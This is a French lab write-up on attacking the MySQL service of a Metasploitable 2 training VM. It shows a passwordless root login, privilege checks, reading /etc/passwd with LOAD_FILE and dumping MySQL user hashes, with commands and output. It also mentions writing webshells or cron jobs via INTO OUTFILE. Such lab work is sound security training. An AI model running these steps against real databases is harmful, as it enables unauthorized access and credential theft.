# Write-up — MySQL 5.0.51a (Metasploitable 2, port 3306)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali : `192.168.56.1`.
Résultat : **accès root à la base** (sans mot de passe) + **privilège FILE** → lecture de
fichiers arbitraires du système.

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`.

**C'est quoi ?** Le serveur MySQL accepte le compte `root` **sans mot de passe** depuis
n'importe quelle machine (`root@%`), avec tous les privilèges. Le privilège `FILE` permet en
plus de lire (et écrire) des fichiers du système de fichiers via SQL.

---

## 1. Recon

```bash
nmap -sV -p 3306 192.168.56.101
```
```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```

## 2. Accès — identifiants par défaut

Le client récent tente du TLS que ce vieux serveur ne gère pas
(`ERROR 2026 TLS/SSL error: wrong version number`) : on désactive SSL avec `--skip-ssl`.

```bash
mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
```
```
VERSION()
5.0.51a-3ubuntu5
CURRENT_USER()
root@%
```

**`root` se connecte sans mot de passe** (`root:root` échoue avec « using password: YES » →
le mot de passe est en fait **vide**). `root@%` = autorisé depuis n'importe quelle IP.

## 3. Privilèges

```bash
mysql -h 192.168.56.101 -u root --skip-ssl -e "SHOW GRANTS FOR CURRENT_USER();"
```
```
Grants for root@%
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
```

`ALL PRIVILEGES` inclut le privilège **`FILE`** — c'est lui qui permet de lire/écrire des
fichiers du système via SQL (`LOAD_FILE`, `INTO OUTFILE`).

## 4. Exploitation du privilège FILE — lecture de fichiers arbitraires

```bash
mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
```

`LOAD_FILE` lit n'importe quel fichier accessible au processus `mysqld` — ici tout
`/etc/passwd`, qui livre la **liste complète des comptes système** (msfadmin, user, service,
postgres…), matière première pour du bruteforce SSH/Telnet ciblé.

Les empreintes des comptes MySQL sont aussi lisibles directement :
```bash
mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT User,Password FROM mysql.user;"
```
```
User              Password
debian-sys-maint
root                          <- vide
guest
```

## 5. Portée

Au-delà de la lecture, `FILE` + `INTO OUTFILE` permet d'**écrire** des fichiers avec les
droits du processus mysqld (webshell dans un répertoire web inscriptible, tâche cron, UDF…),
donc une voie possible vers l'exécution de code. Ici, la démonstration s'arrête à la preuve
nette : **contrôle total de la base + lecture arbitraire de fichiers** sans aucun mot de passe.

## 6. Preuve (résumé)

- `CURRENT_USER()` = `root@%` sans mot de passe
- `SHOW GRANTS` = `ALL PRIVILEGES ... WITH GRANT OPTION`
- `LOAD_FILE('/etc/passwd')` renvoie le contenu du fichier → privilège FILE actif

---

**Pour rejouer :** `./start.sh`, localiser l'IP, puis les étapes 2→4. Toujours `--skip-ssl`
avec ce serveur 5.0.
